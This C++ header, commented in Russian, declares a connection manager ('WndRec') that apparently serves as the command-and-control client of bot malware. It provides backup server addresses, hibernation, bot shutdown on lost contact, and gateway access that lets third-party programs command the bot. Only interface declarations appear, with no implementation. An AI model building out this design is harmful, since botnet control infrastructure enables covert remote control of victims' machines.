#pragma once

#include "core\core.h"
#include "WndRec\sender.h"

namespace WndRec
{

const int MinSizePackage = 4096; //минимально выделяем количество памяти для пакета

const int MaxIPOnServer = 4; //количество IP адресов серверов на один менеджер (основной и дублирующие)
const int MaxServers = 10; //максимальное количество работающих серверов

//пакет отправляемых данных
struct Package
{
	uint id;
	int cmd;
	uint time; //время создания пакета, в милисекундах
	Mem::Data data; //данные в пакете
	int flags; //1 - при обрыве связи удалять пакет из списка
	Package* next;
};

struct ListPackage
{
	CRITICAL_SECTION lock;
	Package* last;
	int count;
};

struct IPServer
{
	char ip[128];
	int port;
};

struct ServerData
{
//	int scServer; //сокет связи с сервером
	IOServer io;
	IPServer ip[MaxIPOnServer]; //адреса серверов
	int c_ip;
	int currIP; //номер сервера к которому подключились
	int stopManager; //для остановки потока менеджера, 0 - менеджер работает, 1 - нужно завершить поток менеджера
					 //2 - поток завершен

	ListPackage packageIn; //список входных пакетов (присланных сервером)
	ListPackage packageOut; //список исходящих пакетов (отсылаемых серверу)
	ListPackage packageFree; //список свободных пакетов

	uint downtime; //максимальное время простоя
	SenderBuf* buf; //буфера для операций чтения и записи
	int flags; // смотри параметр flags в функции Init

	DWORD timeConnect; //время коннекта
	int attemptsConnect; //попыток коннекта
	int sleep; //время спячки в секундах во время гибернации
};

//инициализация менеджера, возвращает TRUE - менеджер запущен, FALSE - ошибка инициализации
//flags: 1 - запуск в режиме спячки, 2 - не проверять на совпадение ip и port (используется для создания дублирующего соединения)
//		4 - завершать работу сервера при обрыве связи, 8 - если долго не получается соединиться с сервером, то завершаем работу бота 
//downtime - время простоя в минутах, по истечении которого менеджер отключается от сервера
//			если 0, то будет равно MaxTimeNoAction
//возвращает ид менеджера, по которому нужно обращаться к остальным функциям
ServerData* Init( int flags, const char* ip, int port, int downtime );
//отключает менеджер
void Release( ServerData* );
//насильно соединяется с указанным адресом сервера, только если он есть в списке запасных
//старое соединение закрывается
bool Reconnect( ServerData* server, const char* ip, int port );
//обновление настроек 
//setFlags - флаги которые нужно установить, resetFlags - флаги которые нужно сбросить
//downtime - новое время отключения в минутах, если - -1, то не нужно менять
void UpdateSettings( ServerData*, int setFlags, int resetFlags, int downtime );
//отправляет команду с данными на сервер, возвращает идентификатор посланного пакета, если возращает 0,
//то ошибка отправки.
//Если пакет имеет размер более 4096 байт, то он делится на несколько пакетов, каждый не более 4096 байт,
//при этом для каждой части будет одна и таже команда
//flags - 1 - при разрыве связи удалять пакет из очереди, 2 - при обрыве связи не ждать возобновления связи
//и возвращать 0, чтобы знать что был обрыв связи, 4 - добавить пакет в начало очереди (самый высокий приоритет),
DWORD WriteData( ServerData* server, int cmd, const void* data, int c_data, int flags = 0, uint id = 0 );
//ждет когда отправляемых пакетов станет меньше min но не более wait миллисекунд 
void WaitSendedPackages( ServerData* server, int min, int wait );
//читает данные по идентификатору возвращаенному функцией WriteData. Возвращает длину полученных данных.
//data - указатель на буфер куда будут ложится данные, szData - размер буфера, если szData < 0, то
//система сама выделяет нужное количество памяти и возвращает в data, в таких случаях нужно самим освобождать
//память.
//wait - количество секунд ожидания данных
//если возвращается 0, то ошибка чтения, если -1, то данных еще нет, нужно еще ждать
int ReadData( ServerData* server, DWORD id, int cmd, void** data, int szData, int wait );
//тоже что и ReadData только в data уже находится выделенная память
int ReadData2( ServerData* server, DWORD id, int cmd, void* data, int szData, int wait );
//отсылает команду с данными и получает результат. Выполяет вызов WriteData() и ReadData()
int GetData( ServerData* server, int cmd, void* sendData, int c_sendData, void** recvData, int szRecvData, int flags, int wait );
//тоже что и GetData только в recvData уже находится выделенная память
int GetData2( ServerData* server, int cmd, void* sendData, int c_sendData, void* recvData, int szRecvData, int flags, int wait );
//выйти из спячки. Если бот долго не общается сервером, то он входит в режим спячки (отключается от сервера)
//Эта функция пробуждает поток и ждет пока произойдет соединение, если все удачно, то возвращает 0
//если notWait = true, то не ждем пока выйдет из режима спячки
int OutOfHibernation( ServerData* server, bool notWait = false );
//добавление IP дублирующего сервера, на случай если к основному не будет доступа
//возвращает TRUE, если IP добавлен
DWORD AddIPServer( ServerData* server, const char* ip, int port );

//выделяет пакет нужного размера
Package* AllocPackage( ServerData* server, int sz );
//отправляет пакет выделенный AllocPackage(), возвращает id пакета. В пакете должен быть заполнен
//данными в поле data и указан их размер в c_data
//описание flags см. в функции WriteData
DWORD WritePackage( ServerData* server, int cmd, Package* p, int flags = 0 );

const char* GetIPServer(ServerData* server);
int GetPortServer(ServerData* server);

//считывает команду от сервера, диапазоны команд задаются в двухмерном массиве cmds: cmds[i][0]-cmds[i][1] включительно,
//последняя пара массива должна быть нулями, что сигнализирует об окончании диапазонов. 
//считанная команда ложится в cmd, возвращается количество байт пришедших с командой, в data - сами эти данные,
//szData - размер буфера data. wait - время ожидания команды в миллисекундах
//Если функция возвращает -1, то истекло время ожидания
int ReadCmd( ServerData* server, int& cmd, uint& id, const int cmds[][2], Mem::Data& data, int wait );
//войти в режим спячки, time время в секундах на которое спим, если 0, то спим вечно
void RunHibernation( ServerData* server, int time );
//ждет пока отправится пакет id, т. е. пока он не удалится из исходящей очереди, wait - время ожидания
//в милисекундах
//возвращает: true - пакет отправился, false - пакет не отправился (закончилось время ожидания)
bool WaitOutPackage( ServerData* server, DWORD id, int wait = 24 * 3600 * 1000 ); 

//дублирует текущий сервер, т. е. создает новое соединение с параметрами текущего сервера
//необходимо для работы сторонних программ посредством сервера, т. е. все пакеты идущие от бота 
//будут переданы сервером программе заказавшей это соединение. Это позволит напрямую давать команды
//боту сторонним прогам посредством сервера (сервер выступает в роли шлюза)
//Возврашает созданный новый сервер, если 0, то ошибка
ServerData* DuplicationServer( ServerData* server, int id );

//отправляет строку, где id - код информации о строке, subId - уточняющий код строки
DWORD SendStr( ServerData* server, int id, int subId, const char* s, int c_s );

}
